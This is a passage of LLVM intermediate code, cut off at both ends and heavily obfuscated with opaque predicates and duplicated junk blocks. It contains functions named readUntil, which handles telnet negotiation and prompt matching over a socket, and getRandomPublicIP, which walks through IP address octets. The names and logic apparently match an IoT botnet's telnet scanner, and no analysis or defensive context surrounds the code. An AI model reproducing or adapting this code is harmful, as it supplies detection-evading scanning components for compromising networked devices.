  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 0, %44
  %46 = getelementptr inbounds i8, i8* %42, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %86, label %50

; <label>:50:                                     ; preds = %38
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 32
  br i1 %61, label %86, label %62

; <label>:62:                                     ; preds = %50
  %63 = load i8*, i8** %3, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 13
  br i1 %73, label %86, label %74

; <label>:74:                                     ; preds = %62
  %75 = load i8*, i8** %3, align 8
  %76 = load i32, i32* %5, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i32, i32* %7, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 0, %80
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 10
  br label %86

; <label>:86:                                     ; preds = %74, %62, %50, %38
  %87 = phi i1 [ true, %62 ], [ true, %50 ], [ true, %38 ], [ %85, %74 ]
  %88 = load i32, i32* @x.47
  %89 = load i32, i32* @y.48
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %86
  %96 = load i32, i32* @x.47
  %97 = load i32, i32* @y.48
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %104

; <label>:104:                                    ; preds = %originalBBpart24, %34
  %105 = phi i1 [ false, %34 ], [ %87, %originalBBpart24 ]
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %104
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %7, align 4
  br label %34

; <label>:109:                                    ; preds = %104
  %110 = load i8*, i8** %3, align 8
  %111 = load i32, i32* %5, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  %114 = load i32, i32* %7, align 4
  %115 = sext i32 %114 to i64
  %116 = sub i64 0, %115
  %117 = getelementptr inbounds i8, i8* %113, i64 %116
  %118 = load i8, i8* %117, align 1
  %119 = sext i8 %118 to i32
  %120 = load i8*, i8** %4, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp eq i32 %119, %125
  br i1 %126, label %127, label %128

; <label>:127:                                    ; preds = %109
  store i32 1, i32* %2, align 4
  br label %133

; <label>:128:                                    ; preds = %109
  br label %129

; <label>:129:                                    ; preds = %128
  %130 = load i32, i32* %6, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %6, align 4
  br label %11

; <label>:132:                                    ; preds = %originalBBpart2
  store i32 0, i32* %2, align 4
  br label %133

; <label>:133:                                    ; preds = %132, %127
  %134 = load i32, i32* %2, align 4
  ret i32 %134

originalBBalteredBB:                              ; preds = %originalBB, %11
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = load i8*, i8** %4, align 8
  %138 = call i64 @strlen(i8* %137) #10
  %139 = icmp ult i64 %136, %138
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %86
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = load i32, i32* @x.49
  %10 = load i32, i32* @y.50
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %struct.__sigset_t, align 8
  %30 = alloca %struct.timeval, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 %0, i32* %18, align 4
  store i8* %1, i8** %19, align 8
  store i32 %2, i32* %20, align 4
  store i32 %3, i32* %21, align 4
  store i32 %4, i32* %22, align 4
  store i8* %5, i8** %23, align 8
  store i32 %6, i32* %24, align 4
  store i32 %7, i32* %25, align 4
  %34 = load i32, i32* %25, align 4
  store i32 %34, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %35 = load i32, i32* %21, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  store i64 %36, i64* %37, align 8
  %38 = load i32, i32* %22, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  store i64 %39, i64* %40, align 8
  store i8* null, i8** %31, align 8
  %41 = load i32, i32* @x.49
  %42 = load i32, i32* @y.50
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %originalBBpart291, %originalBBpart2
  %50 = load i32, i32* %26, align 4
  %51 = add nsw i32 %50, 2
  %52 = load i32, i32* %24, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %64

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  %56 = load i64, i64* %55, align 8
  %57 = icmp sgt i64 %56, 0
  br i1 %57, label %62, label %58

; <label>:58:                                     ; preds = %54
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  %60 = load i64, i64* %59, align 8
  %61 = icmp sgt i64 %60, 0
  br label %62

; <label>:62:                                     ; preds = %58, %54
  %63 = phi i1 [ true, %54 ], [ %61, %58 ]
  br label %64

; <label>:64:                                     ; preds = %62, %49
  %65 = phi i1 [ false, %49 ], [ %63, %62 ]
  br i1 %65, label %66, label %281

; <label>:66:                                     ; preds = %64
  %67 = load i32, i32* @x.49
  %68 = load i32, i32* @y.50
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i32, i32* @x.49
  %76 = load i32, i32* @y.50
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:83:                                     ; preds = %originalBBpart24
  %84 = load i32, i32* @x.49
  %85 = load i32, i32* @y.50
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %93 = getelementptr inbounds [16 x i64], [16 x i64]* %92, i64 0, i64 0
  %94 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %93) #2, !srcloc !4
  %95 = extractvalue { i64, i64* } %94, 0
  %96 = extractvalue { i64, i64* } %94, 1
  %97 = trunc i64 %95 to i32
  store i32 %97, i32* %32, align 4
  %98 = ptrtoint i64* %96 to i64
  %99 = trunc i64 %98 to i32
  store i32 %99, i32* %33, align 4
  %100 = load i32, i32* @x.49
  %101 = load i32, i32* @y.50
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %108

; <label>:108:                                    ; preds = %originalBBpart28
  %109 = load i32, i32* @x.49
  %110 = load i32, i32* @y.50
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  %117 = load i32, i32* %18, align 4
  %118 = srem i32 %117, 64
  %119 = zext i32 %118 to i64
  %120 = shl i64 1, %119
  %121 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %122 = load i32, i32* %18, align 4
  %123 = sdiv i32 %122, 64
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds [16 x i64], [16 x i64]* %121, i64 0, i64 %124
  %126 = load i64, i64* %125, align 8
  %127 = or i64 %126, %120
  store i64 %127, i64* %125, align 8
  %128 = load i32, i32* %18, align 4
  %129 = add nsw i32 %128, 1
  %130 = call i32 @select(i32 %129, %struct.__sigset_t* %29, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %30)
  %131 = icmp slt i32 %130, 1
  %132 = load i32, i32* @x.49
  %133 = load i32, i32* @y.50
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart271, label %originalBB10alteredBB

originalBBpart271:                                ; preds = %originalBB10
  br i1 %131, label %140, label %141

; <label>:140:                                    ; preds = %originalBBpart271
  br label %281

; <label>:141:                                    ; preds = %originalBBpart271
  %142 = load i8*, i8** %23, align 8
  %143 = load i32, i32* %26, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  store i8* %145, i8** %31, align 8
  %146 = load i32, i32* %18, align 4
  %147 = load i8*, i8** %31, align 8
  %148 = call i64 @recv(i32 %146, i8* %147, i64 1, i32 0)
  %149 = trunc i64 %148 to i32
  store i32 %149, i32* %27, align 4
  %150 = load i32, i32* %27, align 4
  %151 = icmp eq i32 %150, -1
  br i1 %151, label %155, label %152

; <label>:152:                                    ; preds = %141
  %153 = load i32, i32* %27, align 4
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %156

; <label>:155:                                    ; preds = %152, %141
  store i32 0, i32* %17, align 4
  br label %286

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* %27, align 4
  %158 = load i32, i32* %26, align 4
  %159 = add nsw i32 %158, %157
  store i32 %159, i32* %26, align 4
  %160 = load i8*, i8** %31, align 8
  %161 = load i8, i8* %160, align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 255
  br i1 %163, label %164, label %218

; <label>:164:                                    ; preds = %156
  %165 = load i32, i32* %18, align 4
  %166 = load i8*, i8** %31, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 1
  %168 = call i64 @recv(i32 %165, i8* %167, i64 2, i32 0)
  %169 = trunc i64 %168 to i32
  store i32 %169, i32* %27, align 4
  %170 = load i32, i32* %27, align 4
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %191, label %172

; <label>:172:                                    ; preds = %164
  %173 = load i32, i32* @x.49
  %174 = load i32, i32* @y.50
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %172
  %181 = load i32, i32* %27, align 4
  %182 = icmp eq i32 %181, 0
  %183 = load i32, i32* @x.49
  %184 = load i32, i32* @y.50
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %182, label %191, label %208

; <label>:191:                                    ; preds = %originalBBpart275, %164
  %192 = load i32, i32* @x.49
  %193 = load i32, i32* @y.50
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %191
  store i32 0, i32* %17, align 4
  %200 = load i32, i32* @x.49
  %201 = load i32, i32* @y.50
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %286

; <label>:208:                                    ; preds = %originalBBpart275
  %209 = load i32, i32* %27, align 4
  %210 = load i32, i32* %26, align 4
  %211 = add nsw i32 %210, %209
  store i32 %211, i32* %26, align 4
  %212 = load i32, i32* %18, align 4
  %213 = load i8*, i8** %31, align 8
  %214 = call i32 @negotiate(i32 %212, i8* %213, i32 3)
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %217, label %216

; <label>:216:                                    ; preds = %208
  store i32 0, i32* %17, align 4
  br label %286

; <label>:217:                                    ; preds = %208
  br label %264

; <label>:218:                                    ; preds = %156
  %219 = load i8*, i8** %23, align 8
  %220 = load i8*, i8** %19, align 8
  %221 = call i8* @strstr(i8* %219, i8* %220) #10
  %222 = icmp ne i8* %221, null
  br i1 %222, label %246, label %223

; <label>:223:                                    ; preds = %218
  %224 = load i32, i32* %20, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %263

; <label>:226:                                    ; preds = %223
  %227 = load i32, i32* @x.49
  %228 = load i32, i32* @y.50
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %226
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 @matchPrompt(i8* %235)
  %237 = icmp ne i32 %236, 0
  %238 = load i32, i32* @x.49
  %239 = load i32, i32* @y.50
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %237, label %246, label %263

; <label>:246:                                    ; preds = %originalBBpart283, %218
  %247 = load i32, i32* @x.49
  %248 = load i32, i32* @y.50
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %246
  store i32 1, i32* %28, align 4
  %255 = load i32, i32* @x.49
  %256 = load i32, i32* @y.50
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %281

; <label>:263:                                    ; preds = %originalBBpart283, %223
  br label %264

; <label>:264:                                    ; preds = %263, %217
  %265 = load i32, i32* @x.49
  %266 = load i32, i32* @y.50
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %264
  %273 = load i32, i32* @x.49
  %274 = load i32, i32* @y.50
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %49

; <label>:281:                                    ; preds = %originalBBpart287, %140, %64
  %282 = load i32, i32* %28, align 4
  %283 = icmp ne i32 %282, 0
  br i1 %283, label %284, label %285

; <label>:284:                                    ; preds = %281
  store i32 1, i32* %17, align 4
  br label %286

; <label>:285:                                    ; preds = %281
  store i32 0, i32* %17, align 4
  br label %286

; <label>:286:                                    ; preds = %285, %284, %216, %originalBBpart279, %155
  %287 = load i32, i32* @x.49
  %288 = load i32, i32* @y.50
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %286
  %295 = load i32, i32* %17, align 4
  %296 = load i32, i32* @x.49
  %297 = load i32, i32* @y.50
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  ret i32 %295

originalBBalteredBB:                              ; preds = %originalBB, %8
  %304 = alloca i32, align 4
  %305 = alloca i32, align 4
  %306 = alloca i8*, align 8
  %307 = alloca i32, align 4
  %308 = alloca i32, align 4
  %309 = alloca i32, align 4
  %310 = alloca i8*, align 8
  %311 = alloca i32, align 4
  %312 = alloca i32, align 4
  %313 = alloca i32, align 4
  %314 = alloca i32, align 4
  %315 = alloca i32, align 4
  %316 = alloca %struct.__sigset_t, align 8
  %317 = alloca %struct.timeval, align 8
  %318 = alloca i8*, align 8
  %319 = alloca i32, align 4
  %320 = alloca i32, align 4
  store i32 %0, i32* %305, align 4
  store i8* %1, i8** %306, align 8
  store i32 %2, i32* %307, align 4
  store i32 %3, i32* %308, align 4
  store i32 %4, i32* %309, align 4
  store i8* %5, i8** %310, align 8
  store i32 %6, i32* %311, align 4
  store i32 %7, i32* %312, align 4
  %321 = load i32, i32* %312, align 4
  store i32 %321, i32* %313, align 4
  store i32 0, i32* %314, align 4
  store i32 0, i32* %315, align 4
  %322 = load i32, i32* %308, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.timeval, %struct.timeval* %317, i32 0, i32 0
  store i64 %323, i64* %324, align 8
  %325 = load i32, i32* %309, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds %struct.timeval, %struct.timeval* %317, i32 0, i32 1
  store i64 %326, i64* %327, align 8
  store i8* null, i8** %318, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  %328 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %329 = getelementptr inbounds [16 x i64], [16 x i64]* %328, i64 0, i64 0
  %330 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %329) #2, !srcloc !4
  %331 = extractvalue { i64, i64* } %330, 0
  %332 = extractvalue { i64, i64* } %330, 1
  %333 = trunc i64 %331 to i32
  store i32 %333, i32* %32, align 4
  %334 = ptrtoint i64* %332 to i64
  %335 = trunc i64 %334 to i32
  store i32 %335, i32* %33, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  %336 = load i32, i32* %18, align 4
  %_ = sub i32 0, %336
  %gen = add i32 %_, 64
  %_11 = sub i32 %336, 64
  %gen12 = mul i32 %_11, 64
  %_13 = sub i32 0, %336
  %gen14 = add i32 %_13, 64
  %_15 = sub i32 %336, 64
  %gen16 = mul i32 %_15, 64
  %337 = srem i32 %336, 64
  %338 = zext i32 %337 to i64
  %_17 = sub i64 1, %338
  %gen18 = mul i64 %_17, %338
  %_19 = sub i64 0, 1
  %gen20 = add i64 %_19, %338
  %_21 = shl i64 1, %338
  %_22 = shl i64 1, %338
  %_23 = sub i64 0, 1
  %gen24 = add i64 %_23, %338
  %_25 = sub i64 1, %338
  %gen26 = mul i64 %_25, %338
  %_27 = sub i64 0, 1
  %gen28 = add i64 %_27, %338
  %_29 = sub i64 1, %338
  %gen30 = mul i64 %_29, %338
  %_31 = sub i64 1, %338
  %gen32 = mul i64 %_31, %338
  %339 = shl i64 1, %338
  %340 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %341 = load i32, i32* %18, align 4
  %_33 = sub i32 %341, 64
  %gen34 = mul i32 %_33, 64
  %_35 = sub i32 %341, 64
  %gen36 = mul i32 %_35, 64
  %_37 = sub i32 0, %341
  %gen38 = add i32 %_37, 64
  %_39 = sub i32 %341, 64
  %gen40 = mul i32 %_39, 64
  %_41 = sub i32 %341, 64
  %gen42 = mul i32 %_41, 64
  %342 = sdiv i32 %341, 64
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds [16 x i64], [16 x i64]* %340, i64 0, i64 %343
  %345 = load i64, i64* %344, align 8
  %_43 = sub i64 0, %345
  %gen44 = add i64 %_43, %339
  %_45 = sub i64 0, %345
  %gen46 = add i64 %_45, %339
  %_47 = sub i64 0, %345
  %gen48 = add i64 %_47, %339
  %_49 = sub i64 0, %345
  %gen50 = add i64 %_49, %339
  %_51 = sub i64 0, %345
  %gen52 = add i64 %_51, %339
  %_53 = sub i64 0, %345
  %gen54 = add i64 %_53, %339
  %_55 = shl i64 %345, %339
  %346 = or i64 %345, %339
  store i64 %346, i64* %344, align 8
  %347 = load i32, i32* %18, align 4
  %_56 = sub i32 %347, 1
  %gen57 = mul i32 %_56, 1
  %_58 = sub i32 0, %347
  %gen59 = add i32 %_58, 1
  %_60 = sub i32 %347, 1
  %gen61 = mul i32 %_60, 1
  %_62 = sub i32 %347, 1
  %gen63 = mul i32 %_62, 1
  %_64 = sub i32 0, %347
  %gen65 = add i32 %_64, 1
  %_66 = sub i32 0, %347
  %gen67 = add i32 %_66, 1
  %_68 = sub i32 %347, 1
  %gen69 = mul i32 %_68, 1
  %348 = add nsw i32 %347, 1
  %349 = call i32 @select(i32 %348, %struct.__sigset_t* %29, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %30)
  %350 = icmp slt i32 %349, 1
  br label %originalBB10

originalBB73alteredBB:                            ; preds = %originalBB73, %172
  %351 = load i32, i32* %27, align 4
  %352 = icmp eq i32 %351, 0
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %191
  store i32 0, i32* %17, align 4
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %226
  %353 = load i8*, i8** %23, align 8
  %354 = call i32 @matchPrompt(i8* %353)
  %355 = icmp ne i32 %354, 0
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %246
  store i32 1, i32* %28, align 4
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %264
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %286
  %356 = load i32, i32* %17, align 4
  br label %originalBB93
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp slt i32 %5, 255
  br i1 %6, label %7, label %56

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %56

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %13 = zext i8 %12 to i32
  %14 = icmp slt i32 %13, 255
  br i1 %14, label %15, label %56

; <label>:15:                                     ; preds = %11
  %16 = load i32, i32* @x.51
  %17 = load i32, i32* @y.52
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %25 = zext i8 %24 to i32
  %26 = icmp slt i32 %25, 255
  %27 = load i32, i32* @x.51
  %28 = load i32, i32* @y.52
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %56

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %37 = add i8 %36, 1
  store i8 %37, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %38 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %39 = add i8 %38, 1
  store i8 %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %40 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %41 = add i8 %40, 1
  store i8 %41, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %42 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %43 = add i8 %42, 1
  store i8 %43, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %45 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %46 = zext i8 %45 to i32
  %47 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %48 = zext i8 %47 to i32
  %49 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %52 = zext i8 %51 to i32
  %53 = call i32 (i8*, i8*, ...) @szprintf(i8* %44, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %46, i32 %48, i32 %50, i32 %52)
